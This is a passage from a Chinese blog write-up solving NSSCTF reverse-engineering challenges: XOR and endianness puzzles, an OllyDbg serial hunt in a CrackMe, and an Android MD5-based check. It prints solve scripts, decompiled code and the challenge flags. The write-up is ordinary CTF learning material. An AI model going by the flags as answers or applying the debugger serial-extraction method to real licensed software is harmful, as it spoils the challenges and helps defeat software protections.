‘N’。那么就能递推后面的s[i]了：s[i+1] &#x3D; arr[i]^s[i]。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line">s = &#123;&#125;</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(arr)):</span><br><span class="line">    s[<span class="number">0</span>] = <span class="built_in">ord</span>(<span class="string">&#x27;N&#x27;</span>)</span><br><span class="line">    s[i+<span class="number">1</span>] = arr[i]^s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Pyth0n_1s_th3_best_l@nguage}</p><h2 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h2><p>不怎么好od，官方wp。</p><p>找出CreakMe的Serial</p><p>要学习使用Olldbg的使用</p><p><img src="https://dqgom7v7dl.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZlMTlhZDUyNmI2YjFkZTY5NTQ2MmZhNjc4NTMyYTFfeW5uV2Rzb3dxMVVKVzVaM2lqUjFEWGtnVUFiRFFLcmpfVG9rZW46Ym94Y255MVFWWFVqMG5oTVdtdDExZ1pCZTNjXzE2Njc1NzYwOTY6MTY2NzU3OTY5Nl9WNA" alt="img"></p><p>[<a href="https://bbs.pediy.com/thread-271168.htm">原创]《使用 OD 从零开始 Cracking》学习笔记-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>通过OD中的字符串查找插件找到判断正确或错误的字符串位置</p><p>使用F2 设置断点 然后F9运行</p><p><img src="https://dqgom7v7dl.feishu.cn/space/api/box/stream/download/asynccode/?code=YzhjYTUzYTU2OTM0ODA2MTk3Y2JlZjljNWFhMWNlYzhfUGR6SW1naEt0NlVrekFwcXNkNjhSenc2ZGVCeUZQQkFfVG9rZW46Ym94Y25WQXgzcENzdThnMmRtWTFYT0FqVkljXzE2Njc1NzYwOTY6MTY2NzU3OTY5Nl9WNA" alt="img"></p><p>在内存中找到了明文比较的serial 取出来即可</p><p>注意这个172….是错误的 需要在内存中找到真正的字符串</p><h2 id="Little-Endian"><a href="#Little-Endian" class="headerlink" title="Little Endian"></a>Little Endian</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  v6 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v6 != (enc[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Data3rr0r!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enc里面就是密文了，逻辑就是v6和enc[i]^0x12345678比较，每次v6都会自增4（没软用）。要注意的是*(_DWORD *)v6是大端序，但是数据在内存中都是小端序，所以要将其反转一下。一般在CPU，x86都是小端序，但是IDA会将之转换为了大端序。python不怎么熟，就直接暴力切片了。</p><p><img src="/posts/9d7b/image-20221020102007833.png" alt="image-20221012173123111"></p><p><img src="/posts/9d7b/image-20221012173123111.png" alt="image-20221012173123111"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = [<span class="number">0x51670536</span>, <span class="number">0x5E4F102C</span>, <span class="number">0x7E402211</span>, <span class="number">0x7C71094B</span>, <span class="number">0x7C553F1C</span>, <span class="number">0x6F5A3816</span>]</span><br><span class="line">dex = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag = enc[i]^<span class="number">0x12345678</span></span><br><span class="line">    dex = dex +<span class="built_in">hex</span>(flag)[<span class="number">8</span>:<span class="number">10</span>]+<span class="built_in">hex</span>(flag)[<span class="number">6</span>:<span class="number">8</span>]+<span class="built_in">hex</span>(flag)[<span class="number">4</span>:<span class="number">6</span>]+<span class="built_in">hex</span>(flag)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b16decode(dex.upper()))</span><br></pre></td></tr></table></figure><p>NSSCTF{Littl3_Endiannnn}</p><h2 id="Easy-Android"><a href="#Easy-Android" class="headerlink" title="Easy_Android"></a>Easy_Android</h2><p>jeb反编译，看核心代码，jav代码审计。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.crackme;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btn_register;</span><br><span class="line">    <span class="keyword">private</span> EditText edit_sn;</span><br><span class="line">    String edit_userName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String arg11, String arg12)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(arg11 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(arg11.length() != <span class="number">0</span> &amp;&amp; (arg12 != <span class="literal">null</span> &amp;&amp; arg12.length() == <span class="number">22</span>)) &#123;</span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                digest.reset();</span><br><span class="line">                digest.update(arg11.getBytes());</span><br><span class="line">                <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> MainActivity.toHexString(digest.digest(), <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> i;</span><br><span class="line">                <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; hexstr.length(); i += <span class="number">2</span>) &#123;</span><br><span class="line">                    sb.append(((<span class="type">char</span>)hexstr.charAt(i)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="string">&quot;flag&#123;&quot;</span> + sb.toString() + <span class="string">&quot;&#125;&quot;</span>.equalsIgnoreCase(arg12);</span><br><span class="line">                <span class="keyword">return</span> v8;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg3)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="number">0x7F06001D</span>);  <span class="comment">// string:unregister &quot;TopCtf&quot;</span></span><br><span class="line">        <span class="built_in">this</span>.edit_userName = <span class="string">&quot;Tenshine&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.edit_sn = (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0051</span>);  <span class="comment">// id:edit_sn</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register = (Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0052</span>);  <span class="comment">// id:button_register</span></span><br><span class="line">        <span class="built_in">this</span>.btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_userName.trim();</span><br><span class="line">                <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>.edit_sn.getText().toString().trim();</span><br><span class="line">                <span class="keyword">if</span>(!MainActivity.<span class="built_in">this</span>.checkSN(v1, v2)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001E</span>, <span class="number">0</span>).show();  <span class="comment">// string:unsuccessed &quot;错误!&quot;</span></span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="number">0x7F06001B</span>, <span class="number">0</span>).show();  <span class="comment">// string:successed &quot;恭喜您！&quot;</span></span><br><span class="line">                MainActivity.<span class="built_in">this</span>.btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                MainActivity.<span class="built_in">this</span>.setTitle(<span class="number">0x7F060019</span>);  <span class="comment">// string:registered &quot;恭喜&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreateOptionsMenu</span><span class="params">(Menu menu)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.getMenuInflater().inflate(<span class="number">0x7F0D0000</span>, menu);  <span class="comment">// menu:activity_main</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">toHexString</span><span class="params">(<span class="type">byte</span>[] arg8, String arg9)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> i$;</span><br><span class="line">        <span class="keyword">for</span>(i$ = <span class="number">0</span>; i$ &lt; arg8.length; ++i$) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(arg8[i$] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span>(hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hexString.append(hex).append(arg9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tenshine经过md5加密后得到的字符串，每次取i +&#x3D; 2，得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Tenshine&#x27;</span></span><br><span class="line">md5 = hashlib.md5(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5),<span class="number">2</span>):</span><br><span class="line">    flag += md5[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NSSCTF&#123;%s&#125;&#x27;</span>%flag)</span><br></pre></td></tr></table></figure><h2 id="来解个方程"><a href="#来解个方程" class="headerlink" title="来解个方程?"></a>来解个方程?</h2><p>ida进入核心函数，可以看到result &#x3D; (unsigned int)(186 * v18 + 2712 * v17 + 2136 * v16 + 98 * v13 + 138 * v14 + 3584 * v15 + 1173 * v19，那么我们的目标就是求这几个参数了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+20h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+24h] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+28h] [rbp-98h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+30h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+34h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+38h] [rbp-88h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+3Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+40h] [rbp-80h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+48h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4Ch] [rbp-74h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+50h] [rbp-70h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+54h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+58h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+5Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+60h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+64h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+68h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+6Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [rsp+70h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+74h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  _BYTE *i; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = a1; *i; ++i )</span><br><span class="line">    ++v26;</span><br><span class="line">  <span class="keyword">if</span> ( v26 == <span class="number">22</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v26; ++j )</span><br><span class="line">      *(&amp;v2 + j) = (<span class="type">char</span>)a1[j];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">245</span> * v6 + <span class="number">395</span> * v5 + <span class="number">3541</span> * v4 + <span class="number">2051</span> * v3 + <span class="number">3201</span> * v2 + <span class="number">1345</span> * v7 != <span class="number">855009</span></span><br><span class="line">      || <span class="number">3270</span> * v6 + <span class="number">3759</span> * v5 + <span class="number">3900</span> * v4 + <span class="number">3963</span> * v3 + <span class="number">1546</span> * v2 + <span class="number">3082</span> * v7 != <span class="number">1515490</span></span><br><span class="line">      || <span class="number">526</span> * v6 + <span class="number">2283</span> * v5 + <span class="number">3349</span> * v4 + <span class="number">2458</span> * v3 + <span class="number">2012</span> * v2 + <span class="number">268</span> * v7 != <span class="number">854822</span></span><br><span class="line">      || <span class="number">3208</span> * v6 + <span class="number">2021</span> * v5 + <span class="number">3146</span> * v4 + <span class="number">1571</span> * v3 + <span class="number">2569</span> * v2 + <span class="number">1395</span> * v7 != <span class="number">1094422</span></span><br><span class="line">      || <span class="number">3136</span> * v6 + <span class="number">3553</span> * v5 + <span class="number">2997</span> * v4 + <span class="number">1824</span> * v3 + <span class="number">1575</span> * v2 + <span class="number">1599</span> * v7 != <span class="number">1136398</span></span><br><span class="line">      || <span class="number">2300</span> * v6 + <span class="number">1349</span> * v5 + <span class="number">86</span> * v4 + <span class="number">3672</span> * v3 + <span class="number">2908</span> * v2 + <span class="number">1681</span> * v7 != <span class="number">939991</span></span><br><span class="line">      || <span class="number">212</span> * v22 + <span class="number">153</span> * v21 + <span class="number">342</span> * v20 + <span class="number">490</span> * v12 + <span class="number">325</span> * v11 + <span class="number">485</span> * v10 + <span class="number">56</span> * v9 + <span class="number">202</span> * v8 + <span class="number">191</span> * v23 != <span class="number">245940</span></span><br><span class="line">      || <span class="number">348</span> * v22 + <span class="number">185</span> * v21 + <span class="number">134</span> * v20 + <span class="number">153</span> * v12 + <span class="number">460</span> * v9 + <span class="number">207</span> * v8 + <span class="number">22</span> * v10 + <span class="number">24</span> * v11 + <span class="number">22</span> * v23 != <span class="number">146392</span></span><br><span class="line">      || <span class="number">177</span> * v22 + <span class="number">231</span> * v21 + <span class="number">489</span> * v20 + <span class="number">339</span> * v12 + <span class="number">433</span> * v11 + <span class="number">311</span> * v10 + <span class="number">164</span> * v9 + <span class="number">154</span> * v8 + <span class="number">100</span> * v23 != <span class="number">239438</span></span><br><span class="line">      || <span class="number">68</span> * v20 + <span class="number">466</span> * v12 + <span class="number">470</span> * v11 + <span class="number">22</span> * v10 + <span class="number">270</span> * v9 + <span class="number">360</span> * v8 + <span class="number">337</span> * v21 + <span class="number">257</span> * v22 + <span class="number">82</span> * v23 != <span class="number">233887</span></span><br><span class="line">      || <span class="number">246</span> * v22 + <span class="number">235</span> * v21 + <span class="number">468</span> * v20 + <span class="number">91</span> * v12 + <span class="number">151</span> * v11 + <span class="number">197</span> * v8 + <span class="number">92</span> * v9 + <span class="number">73</span> * v10 + <span class="number">54</span> * v23 != <span class="number">152663</span></span><br><span class="line">      || <span class="number">241</span> * v22 + <span class="number">377</span> * v21 + <span class="number">131</span> * v20 + <span class="number">243</span> * v12 + <span class="number">233</span> * v11 + <span class="number">55</span> * v10 + <span class="number">376</span> * v9 + <span class="number">242</span> * v8 + <span class="number">343</span> * v23 != <span class="number">228375</span></span><br><span class="line">      || <span class="number">356</span> * v22 + <span class="number">200</span> * v21 + <span class="number">136</span> * v11 + <span class="number">301</span> * v10 + <span class="number">284</span> * v9 + <span class="number">364</span> * v8 + <span class="number">458</span> * v12 + <span class="number">5</span> * v20 + <span class="number">61</span> * v23 != <span class="number">211183</span></span><br><span class="line">      || <span class="number">154</span> * v22 + <span class="number">55</span> * v21 + <span class="number">406</span> * v20 + <span class="number">107</span> * v12 + <span class="number">80</span> * v10 + <span class="number">66</span> * v8 + <span class="number">71</span> * v9 + <span class="number">17</span> * v11 + <span class="number">71</span> * v23 != <span class="number">96788</span></span><br><span class="line">      || <span class="number">335</span> * v22 + <span class="number">201</span> * v21 + <span class="number">197</span> * v11 + <span class="number">280</span> * v10 + <span class="number">409</span> * v9 + <span class="number">56</span> * v8 + <span class="number">494</span> * v12 + <span class="number">63</span> * v20 + <span class="number">99</span> * v23 != <span class="number">204625</span></span><br><span class="line">      || <span class="number">428</span> * v18 + <span class="number">1266</span> * v17 + <span class="number">1326</span> * v16 + <span class="number">1967</span> * v15 + <span class="number">3001</span> * v14 + <span class="number">81</span> * v13 + <span class="number">2439</span> * v19 != <span class="number">1109296</span></span><br><span class="line">      || <span class="number">2585</span> * v18 + <span class="number">4027</span> * v17 + <span class="number">141</span> * v16 + <span class="number">2539</span> * v15 + <span class="number">3073</span> * v14 + <span class="number">164</span> * v13 + <span class="number">1556</span> * v19 != <span class="number">1368547</span></span><br><span class="line">      || <span class="number">2080</span> * v18 + <span class="number">358</span> * v17 + <span class="number">1317</span> * v16 + <span class="number">1341</span> * v15 + <span class="number">3681</span> * v14 + <span class="number">2197</span> * v13 + <span class="number">1205</span> * v19 != <span class="number">1320274</span></span><br><span class="line">      || <span class="number">840</span> * v18 + <span class="number">1494</span> * v17 + <span class="number">2353</span> * v16 + <span class="number">235</span> * v15 + <span class="number">3843</span> * v14 + <span class="number">1496</span> * v13 + <span class="number">1302</span> * v19 != <span class="number">1206735</span></span><br><span class="line">      || <span class="number">101</span> * v18 + <span class="number">2025</span> * v17 + <span class="number">2842</span> * v16 + <span class="number">1559</span> * v15 + <span class="number">2143</span> * v14 + <span class="number">3008</span> * v13 + <span class="number">981</span> * v19 != <span class="number">1306983</span></span><br><span class="line">      || <span class="number">1290</span> * v18 + <span class="number">3822</span> * v17 + <span class="number">1733</span> * v16 + <span class="number">292</span> * v15 + <span class="number">816</span> * v14 + <span class="number">1017</span> * v13 + <span class="number">3199</span> * v19 != <span class="number">1160573</span></span><br><span class="line">      || (result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">186</span> * v18 + <span class="number">2712</span> * v17 + <span class="number">2136</span> * v16 + <span class="number">98</span> * v13 + <span class="number">138</span> * v14 + <span class="number">3584</span> * v15 + <span class="number">1173</span> * v19),</span><br><span class="line">          (_DWORD)result != <span class="number">1005746</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span 